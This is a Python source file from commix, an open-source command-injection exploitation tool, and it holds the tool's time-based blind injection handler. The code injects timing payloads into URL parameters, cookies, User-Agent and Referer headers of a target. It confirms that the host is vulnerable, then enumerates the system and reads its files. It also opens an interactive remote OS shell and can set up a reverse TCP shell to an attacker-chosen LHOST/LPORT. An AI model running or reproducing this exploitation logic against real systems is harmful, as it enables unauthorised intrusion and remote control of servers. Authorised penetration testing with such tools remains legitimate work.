#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix (@commixproject) tool.
Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
https://github.com/stasinopoulos/commix

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import logs
from src.utils import settings

from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import headers
from src.core.shells import reverse_tcp
from src.core.requests import parameters
from src.core.injections.controller import checks

from src.core.injections.blind.techniques.time_based import tb_injector
from src.core.injections.blind.techniques.time_based import tb_payloads
from src.core.injections.blind.techniques.time_based import tb_enumeration
from src.core.injections.blind.techniques.time_based import tb_file_access

"""
The "time-based" injection technique on Blind OS Command Injection.
"""

"""
The "time-based" injection technique handler.
"""
def tb_injection_handler(url, delay, filename, http_request_method, url_time_response):

  percent = 0
  counter = 1
  num_of_chars = 1
  vp_flag = True
  no_result = True
  is_encoded = False
  is_vulnerable = False
  export_injection_info = False
  how_long = 0
  injection_type = "Blind Command Injection"
  technique = "time-based injection technique"

  # Check if defined "--maxlen" option.
  if menu.options.maxlen:
    maxlen = settings.MAXLEN
    
  # Check if defined "--url-reload" option.
  if menu.options.url_reload == True:
    print Fore.YELLOW + "(^) Warning: The '--url-reload' option is not available in "+ technique +"." + Style.RESET_ALL
  
  percent = str(percent)+"%"
  sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
  sys.stdout.flush()

  # Calculate all possible combinations
  total = (len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES) - len(settings.JUNK_COMBINATION))

  for prefix in settings.PREFIXES:
    for suffix in settings.SUFFIXES:
      for separator in settings.SEPARATORS:
        num_of_chars = num_of_chars + 1

        # Check for bad combination of prefix and separator
        combination = prefix + separator
        if combination in settings.JUNK_COMBINATION:
          prefix = ""
        
        # Define alter shell
        alter_shell = menu.options.alter_shell
        
        # Change TAG on every request to prevent false-positive results.
        TAG = ''.join(random.choice(string.ascii_uppercase) for num_of_chars in range(6))
        tag_length = len(TAG) + 4
        
        for output_length in range(1, int(tag_length)):
          try:

            # Log previous 'how_long' for later comparison
            previous_how_long = how_long

            if alter_shell:
              # Time-based decision payload (check if host is vulnerable).
              payload = tb_payloads.decision_alter_shell(separator, TAG, output_length, delay, http_request_method)
            else:
              # Time-based decision payload (check if host is vulnerable).
              payload = tb_payloads.decision(separator, TAG, output_length, delay, http_request_method)

            # Fix prefixes / suffixes
            payload = parameters.prefixes(payload, prefix)
            payload = parameters.suffixes(payload, suffix)

            if menu.options.base64:
              payload = base64.b64encode(payload)

            # Check if defined "--verbose" option.
            if menu.options.verbose:
              sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL)

            # Cookie Injection
            if settings.COOKIE_INJECTION == True:
              # Check if target host is vulnerable to cookie injection.
              vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
              how_long = tb_injector.cookie_injection_test(url, vuln_parameter, payload)

            # User-Agent Injection
            elif settings.USER_AGENT_INJECTION == True:
              # Check if target host is vulnerable to user-agent injection.
              vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
              how_long = tb_injector.user_agent_injection_test(url, vuln_parameter, payload)

            # Referer Injection
            elif settings.REFERER_INJECTION == True:
              # Check if target host is vulnerable to referer injection.
              vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
              how_long = tb_injector.referer_injection_test(url, vuln_parameter, payload)

            else:
              # Check if target host is vulnerable.
              how_long, vuln_parameter = tb_injector.injection_test(payload, http_request_method, url)
            
            # Injection percentage calculation
            percent = ((num_of_chars * 100) / total)
            float_percent = "{0:.1f}".format(round(((num_of_chars*100)/(total * 1.0)),2))

            if percent == 100 and no_result == True:
              if not menu.options.verbose:
                percent = Fore.RED + "FAILED" + Style.RESET_ALL
              else:
                percent = ""

            else:
              if how_long == previous_how_long + delay:
                # Time relative false positive fixation.
                if len(TAG) == output_length:
                  tmp_how_long = how_long
                  randv1 = random.randrange(0, 1)
                  randv2 = random.randrange(1, 2)
                  randvcalc = randv1 + randv2
                  cmd = "(" + str(randv1) + "+" + str(randv2) + ")"

                  # Check for false positive resutls
                  how_long, output = tb_injector.false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long)
                  
                  if str(tmp_how_long) == str(how_long) and \
                     str(output) == str(randvcalc) and \
                     len(TAG) == output_length:

                    is_vulnerable = True
                    if not menu.options.verbose:
                      percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
                    else:
                      percent = ""
                  else:
                    break
                # False positive
                else:
                  continue
              else:
                percent = str(float_percent)+"%"
                
            if not menu.options.verbose:
              sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
              sys.stdout.flush()

          except KeyboardInterrupt: 
            raise

          except SystemExit:
            raise

          except:
            break
          
          # Yaw, got shellz! 
          # Do some magic tricks!
          if how_long == previous_how_long + delay:
            if (len(TAG) == output_length) and (is_vulnerable == True):
              found = True
              no_result = False
              is_vulnerable = False

              if settings.COOKIE_INJECTION == True: 
                header_name = " Cookie"
                found_vuln_parameter = vuln_parameter
                the_type = " HTTP header"

              elif settings.USER_AGENT_INJECTION == True: 
                header_name = " User-Agent"
                found_vuln_parameter = ""
                the_type = " HTTP header"

              elif settings.REFERER_INJECTION == True: 
                header_name = " Referer"
                found_vuln_parameter = ""
                the_type = " HTTP header"
                
              else:
                header_name = ""
                the_type = " parameter"
                if http_request_method == "GET":
                  found_vuln_parameter = parameters.vuln_GET_param(url)
                else :
                  found_vuln_parameter = vuln_parameter

              if len(found_vuln_parameter) != 0 :
                found_vuln_parameter = " '" + Style.UNDERLINE + found_vuln_parameter + Style.RESET_ALL  + Style.BRIGHT + "'" 
              
              # Print the findings to log file.
              if export_injection_info == False:
                export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
              if vp_flag == True:
                vp_flag = logs.add_parameter(vp_flag, filename, http_request_method, vuln_parameter, payload)
              logs.update_payload(filename, counter, payload) 
              counter = counter + 1
              
              # Print the findings to terminal.
              print Style.BRIGHT + "\n(!) The ("+ http_request_method + ")" + found_vuln_parameter + header_name + the_type + " is vulnerable to "+ injection_type + "." + Style.RESET_ALL
              print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
              print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
              print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL

              # Check for any enumeration options.
              if settings.ENUMERATION_DONE == True:
                while True:
                  enumerate_again = raw_input("\n(?) Do you want to enumerate again? [Y/n/q] > ").lower()
                  if enumerate_again in settings.CHOISE_YES:
                    tb_enumeration.do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
                    break
                  elif enumerate_again in settings.CHOISE_NO: 
                    break
                  elif enumerate_again in settings.CHOISE_QUIT:
                    sys.exit(0)
                  else:
                    if enumerate_again == "":
                      enumerate_again = "enter"
                    print Back.RED + "(x) Error: '" + enumerate_again + "' is not a valid answer." + Style.RESET_ALL
                    pass
              else:
                tb_enumeration.do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)

              # Check for any system file access options.
              if settings.FILE_ACCESS_DONE == True:
                while True:
                  file_access_again = raw_input("(?) Do you want to access files again? [Y/n/q] > ").lower()
                  if file_access_again in settings.CHOISE_YES:
                    tb_file_access.do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
                    break
                  elif file_access_again in settings.CHOISE_NO: 
                    break
                  elif file_access_again in settings.CHOISE_QUIT:
                    sys.exit(0)
                  else:
                    if file_access_again == "":
                      file_access_again = "enter"
                    print Back.RED + "(x) Error: '" + file_access_again  + "' is not a valid answer." + Style.RESET_ALL
                    pass
              else:
                tb_file_access.do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)

              # Check if defined single cmd.
              if menu.options.os_cmd:
                cmd = menu.options.os_cmd
                check_how_long, output = tb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
                # Exploirt injection result
                tb_injector.export_injection_results(cmd, separator, output, check_how_long)
                sys.exit(0)

              # Pseudo-Terminal shell
              go_back = False
              go_back_again = False
              while True:
                if go_back == True:
                  break
                gotshell = raw_input("(?) Do you want a Pseudo-Terminal? [Y/n/q] > ").lower()
                if gotshell in settings.CHOISE_YES:
                  print ""
                  print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
                  while True:
                    try:
                      cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                      cmd = checks.escaped_cmd(cmd)
                      if cmd.lower() in settings.SHELL_OPTIONS:
                        os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
                        if os_shell_option == False:
                          return False
                        elif os_shell_option == "quit":                    
                          sys.exit(0)
                        elif os_shell_option == "back":
                          go_back = True
                          break
                        elif os_shell_option == "os_shell": 
                            print Fore.YELLOW + "(^) Warning: You are already into an 'os_shell' mode." + Style.RESET_ALL + "\n"
                        elif os_shell_option == "reverse_tcp":
                          # Set up LHOST / LPORT for The reverse TCP connection.
                          lhost, lport = reverse_tcp.configure_reverse_tcp()
                          while True:
                            if lhost and lport in settings.SHELL_OPTIONS:
                              result = checks.check_reverse_tcp_options(lhost)
                            else:  
                              cmd = reverse_tcp.reverse_tcp_options(lhost, lport)
                              result = checks.check_reverse_tcp_options(cmd)
                            if result != None:
                              if result == 0:
                                return False
                              elif result == 1 or result == 2:
                                go_back_again = True
                                break
                            # Command execution results.
                            from src.core.injections.results_based.techniques.classic import cb_injector
                            whitespace = settings.WHITESPACES[0]
                            response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
                            # Evaluate injection results.
                            shell = cb_injector.injection_results(response, TAG)
                            # Exploirt injection result
                            if menu.options.verbose:
                              print ""
                            print Back.RED + "(x) Error: The reverse TCP connection has been failed!" + Style.RESET_ALL
                        else:
                          pass
                        
                      else:
                        print ""
                        # The main command injection exploitation.
                        check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
                        # Exploirt injection result
                        tb_injector.export_injection_results(cmd, separator, output, check_how_long)
                        print ""
                    except KeyboardInterrupt: 
                      raise

                    except SystemExit: 
                      raise
                      
                elif gotshell in settings.CHOISE_NO:
                  if checks.next_attack_vector(technique, go_back) == True:
                    break
                  else:
                    if no_result == True:
                      return False 
                    else:
                      return True  
                      
                elif gotshell in settings.CHOISE_QUIT:
                  sys.exit(0)

                else:
                  if gotshell == "":
                    gotshell = "enter"
                  print Back.RED + "(x) Error: '" + gotshell + "' is not a valid answer." + Style.RESET_ALL
                  pass
            
            break
          
  if no_result == True:
    print ""
    return False

  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, delay, filename, http_request_method, url_time_response):
  if url_time_response >= settings.SLOW_TARGET_RESPONSE:
    print Fore.YELLOW + "(^) Warning: It is highly recommended, due to serious response delays, to skip the time-based (blind) technique and to continue with the file-based (semiblind) technique." + Style.RESET_ALL 
    while True:
      proceed_option = raw_input("(?) How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > ").lower()
      if proceed_option.lower() in settings.CHOISE_PROCEED :
        if proceed_option.lower() == "s":
          from src.core.injections.semiblind.techniques.file_based import fb_handler
          fb_handler.exploitation(url, delay, filename, http_request_method, url_time_response)
        elif proceed_option.lower() == "c":
          if tb_injection_handler(url, delay, filename, http_request_method, url_time_response) == False:
            return False
        elif proceed_option.lower() == "q":
          raise SystemExit()
      else:
        if proceed_option == "":
          proceed_option = "enter"
        print Back.RED + "(x) Error: '" + proceed_option + "' is not a valid answer." + Style.RESET_ALL
        pass
  else:
    if tb_injection_handler(url, delay, filename, http_request_method, url_time_response) == False:
      return False
#eof
#eof